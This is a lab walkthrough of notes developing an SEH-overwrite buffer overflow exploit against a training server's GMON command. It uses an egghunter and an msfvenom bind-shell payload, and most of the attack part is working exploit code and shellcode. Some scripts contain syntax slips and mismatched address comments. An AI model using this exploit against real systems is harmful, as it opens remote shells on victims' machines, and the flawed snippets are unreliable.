1. Issue initial crash with python script
2. We see that we get a SEH overwrite 
3. Generate a unique string:
msf-pattern_create -l 5009

4. Reissue the payload and note which bytes overwrite the SEH. Before passing the exception to the handler 
(SHIFT+F9), we select View > SEH Chain and get:

00B7FFDC 6D45366D

5. After passing the exception by pressing SHIT+F9 we see that the EIP reg is overwritten with: 
6D45366D

6. We can also see that in our stack, the rest of our buffer is 3 entries down from the top. Therefore we
can look for a POP POP RET instruction to taqke us back to our user-supplied buffer.

7. First, find the offset of the bytes which overwrite our EIP reg:
msf-pattern_offset -q 6D45366D -l 5009
[*] Exact match at offset 3499

8. Ensure we can cleanly overwrite the EIP reg with \x42\x42\x42\x42 per our updated python script:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

buffer="GMON /.:/" + "A"*3499 + "B"*4 + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

9. After issuing the payload, we view our SEH Chain and see that the address 00B7FFDC has been overwritten with:
42424242

10. After passing the exception, our EIP gets cleanly overwritten with 42424242
11. Search for a POP POP RET instruction sequence in one of the dlls:

Method 1: Immnuity Debugger
1. Load exectuable modules
2. Select essfunc.dll
3. Right-click > Search for > Sequence of commands (Crtl+S)
POP r32
POP r32
RETN

First result: 625010B4


Method 2: Mona.py
1. Run cmd: !mona seh
Note: This automatically identifies which modules have been compiled with SafeSEH

First result (of 18): 

0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\shellcode_2\Desktop\essfunc.dll)

Note: I took the last result returned by !mona seh which was address:
625011b3

12. Update python script with address of PPR as such:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625011b3    POP POP RETN

buffer="GMON /.:/" + "A"*3499 + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

13. Place a breakpoint at 625011b3
14. Issue payload
15. Pass the exception
16. See that EIP is overwritten
17. Take the jump using F7
18. We are taken to a small 4-byte buffer. Specifically, we are taken back to the four bytes leading up to our
POP POP RET return address


19. Scrolling upwards in our dump however reveals the rest of our buffer. Thus, we need to perform a negative
jump. Let's try a negative short jump as far back as possible, followed by an egghunter.


20. So we need the opcode/asm for a negative short jump to allow enough space for an egghunter. Roughly
60 bytes (allotting enough for NOP sled)

Note: We can use a built-in Kali tool: msf-metasm_shell which is a shell that will convert assembly instruction
into corresponding opcode/shellcode. i.e.

metasm > add ebx, 300
"\x81\xc3\x2c\x01\x00\x00"
metasm > 

21. Selecting the two bytes we jumped to > Edit > Binary edit... We set them to: EB D0 and hit enter
22. Take the short jump now using F7 and see that we are taken back roughly 46 bytes into our buffer
23. This is enough for an egghunter. Add the negative short jump to the exploit as such:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump
buffer="GMON /.:/" + "A"*3495 + "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()


24. With a breakpoint set at our return address, PPR, land at our short jump opcode at address: B7FFDE,
step through the two NOPs, and see that we are taken back into our buffer to address: B7FFB0

B7FFDE - B7FFB0 = 46 bytes

25. Find the following 32-byte egghunter online from Corelan: https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/


egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

26. Plug this into our exploit as such:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74". # this is the marker/tag: w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";

buffer="GMON /.:/" + "A"*3455 + "\x90"*8 + egghunter  "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()


So we subtracted an even 40 bytes from our initial buffer: 8 bytes for NOPs and 32 for our egghunter.
Thus, we should jump 46 bytes backwards, hit 6 A chars, followed by 8 NOPs, followed by 32 bytes of 
egghunter shellcode.

27. Reissue the payload and check for any bad or malformed characters once the egghunter is loaded into 
memory.

28. No bad chars. We step into our egghunter and place a breakpoint at address:
00B7FFDA   FFE7             JMP EDI

This is where the cpu will scan for our egg in memory. Right now, it will search perpetually because
we haven't added our egg to the beginning our shellcode. So CPU will be stuck at 100%. Stop the scan, and 
edit the python payload as such:


#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

#Where \x77\x30\x30\x74 = w00t (egg)

buffer="GMON /.:/" + "w00tw00t" + "A"*3447 + "\x90"*8 + egghunter + "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

29. Note that we had to subtract 8 bytes from our initial buffer in order to add our egg "w00tw00t" to
the beginning. Once we did that and stepped through the payload, we successfully found our egg and were
taken to the beginning of our code cave at:

003E4B79   41   INC ECX

30. Now all we need to do is generate a bind shell and build it into the python script (keeping potential
bad characters in mind of course)

31. Generate a bind shell using:

msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f python

Payload size: 355 bytes
Final size of python file: 1710 bytes
buf =  ""
buf += "\xdd\xc6\xbe\x3d\x26\x0a\x27\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xd2\xda\xe8"
buf += "\xd2\xd0\xcb\x6f\x1c\x28\x0c\x10\x94\xcd\x3d\x10\xc2"
buf += "\x86\x6e\xa0\x80\xca\x82\x4b\xc4\xfe\x11\x39\xc1\xf1"
buf += "\x92\xf4\x37\x3c\x22\xa4\x04\x5f\xa0\xb7\x58\xbf\x99"
buf += "\x77\xad\xbe\xde\x6a\x5c\x92\xb7\xe1\xf3\x02\xb3\xbc"
buf += "\xcf\xa9\x8f\x51\x48\x4e\x47\x53\x79\xc1\xd3\x0a\x59"
buf += "\xe0\x30\x27\xd0\xfa\x55\x02\xaa\x71\xad\xf8\x2d\x53"
buf += "\xff\x01\x81\x9a\xcf\xf3\xdb\xdb\xe8\xeb\xa9\x15\x0b"
buf += "\x91\xa9\xe2\x71\x4d\x3f\xf0\xd2\x06\xe7\xdc\xe3\xcb"
buf += "\x7e\x97\xe8\xa0\xf5\xff\xec\x37\xd9\x74\x08\xb3\xdc"
buf += "\x5a\x98\x87\xfa\x7e\xc0\x5c\x62\x27\xac\x33\x9b\x37"
buf += "\x0f\xeb\x39\x3c\xa2\xf8\x33\x1f\xab\xcd\x79\x9f\x2b"
buf += "\x5a\x09\xec\x19\xc5\xa1\x7a\x12\x8e\x6f\x7d\x55\xa5"
buf += "\xc8\x11\xa8\x46\x29\x38\x6f\x12\x79\x52\x46\x1b\x12"
buf += "\xa2\x67\xce\x8f\xaa\xce\xa1\xad\x57\xb0\x11\x72\xf7"
buf += "\x59\x78\x7d\x28\x79\x83\x57\x41\x12\x7e\x58\x7c\xbf"
buf += "\xf7\xbe\x14\x2f\x5e\x68\x80\x8d\x85\xa1\x37\xed\xef"
buf += "\x99\xdf\xa6\xf9\x1e\xe0\x36\x2c\x09\x76\xbd\x23\x8d"
buf += "\x67\xc2\x69\xa5\xf0\x55\xe7\x24\xb3\xc4\xf8\x6c\x23"
buf += "\x64\x6a\xeb\xb3\xe3\x97\xa4\xe4\xa4\x66\xbd\x60\x59"
buf += "\xd0\x17\x96\xa0\x84\x50\x12\x7f\x75\x5e\x9b\xf2\xc1"
buf += "\x44\x8b\xca\xca\xc0\xff\x82\x9c\x9e\xa9\x64\x77\x51"
buf += "\x03\x3f\x24\x3b\xc3\xc6\x06\xfc\x95\xc6\x42\x8a\x79"
buf += "\x76\x3b\xcb\x86\xb7\xab\xdb\xff\xa5\x4b\x23\x2a\x6e"
buf += "\x6b\xc6\xfe\x9b\x04\x5f\x6b\x26\x49\x60\x46\x65\x74"
buf += "\xe3\x62\x16\x83\xfb\x07\x13\xcf\xbb\xf4\x69\x40\x2e"
buf += "\xfa\xde\x61\x7b" 

32. Add into our python script as such:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 3499

#625010b4    POP POP RETN
#EB D0       Negative Short Jump

#Egghunter - 32 bytes
egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

#Where \x77\x30\x30\x74 = w00t (egg)

#shellcode - 355 bytes
buf =  ""
buf += "\xdd\xc6\xbe\x3d\x26\x0a\x27\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xd2\xda\xe8"
buf += "\xd2\xd0\xcb\x6f\x1c\x28\x0c\x10\x94\xcd\x3d\x10\xc2"
buf += "\x86\x6e\xa0\x80\xca\x82\x4b\xc4\xfe\x11\x39\xc1\xf1"
buf += "\x92\xf4\x37\x3c\x22\xa4\x04\x5f\xa0\xb7\x58\xbf\x99"
buf += "\x77\xad\xbe\xde\x6a\x5c\x92\xb7\xe1\xf3\x02\xb3\xbc"
buf += "\xcf\xa9\x8f\x51\x48\x4e\x47\x53\x79\xc1\xd3\x0a\x59"
buf += "\xe0\x30\x27\xd0\xfa\x55\x02\xaa\x71\xad\xf8\x2d\x53"
buf += "\xff\x01\x81\x9a\xcf\xf3\xdb\xdb\xe8\xeb\xa9\x15\x0b"
buf += "\x91\xa9\xe2\x71\x4d\x3f\xf0\xd2\x06\xe7\xdc\xe3\xcb"
buf += "\x7e\x97\xe8\xa0\xf5\xff\xec\x37\xd9\x74\x08\xb3\xdc"
buf += "\x5a\x98\x87\xfa\x7e\xc0\x5c\x62\x27\xac\x33\x9b\x37"
buf += "\x0f\xeb\x39\x3c\xa2\xf8\x33\x1f\xab\xcd\x79\x9f\x2b"
buf += "\x5a\x09\xec\x19\xc5\xa1\x7a\x12\x8e\x6f\x7d\x55\xa5"
buf += "\xc8\x11\xa8\x46\x29\x38\x6f\x12\x79\x52\x46\x1b\x12"
buf += "\xa2\x67\xce\x8f\xaa\xce\xa1\xad\x57\xb0\x11\x72\xf7"
buf += "\x59\x78\x7d\x28\x79\x83\x57\x41\x12\x7e\x58\x7c\xbf"
buf += "\xf7\xbe\x14\x2f\x5e\x68\x80\x8d\x85\xa1\x37\xed\xef"
buf += "\x99\xdf\xa6\xf9\x1e\xe0\x36\x2c\x09\x76\xbd\x23\x8d"
buf += "\x67\xc2\x69\xa5\xf0\x55\xe7\x24\xb3\xc4\xf8\x6c\x23"
buf += "\x64\x6a\xeb\xb3\xe3\x97\xa4\xe4\xa4\x66\xbd\x60\x59"
buf += "\xd0\x17\x96\xa0\x84\x50\x12\x7f\x75\x5e\x9b\xf2\xc1"
buf += "\x44\x8b\xca\xca\xc0\xff\x82\x9c\x9e\xa9\x64\x77\x51"
buf += "\x03\x3f\x24\x3b\xc3\xc6\x06\xfc\x95\xc6\x42\x8a\x79"
buf += "\x76\x3b\xcb\x86\xb7\xab\xdb\xff\xa5\x4b\x23\x2a\x6e"
buf += "\x6b\xc6\xfe\x9b\x04\x5f\x6b\x26\x49\x60\x46\x65\x74"
buf += "\xe3\x62\x16\x83\xfb\x07\x13\xcf\xbb\xf4\x69\x40\x2e"
buf += "\xfa\xde\x61\x7b"

buffer="GMON /.:/" + "w00tw00t" + buf +  "A"*(3447 - len(buf)) + "\x90"*8 + egghunter + "\x90\x90\xEB\xD0" + "\xB3\x11\x50\x62" + "C"*(5009 - 3503)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()






 



























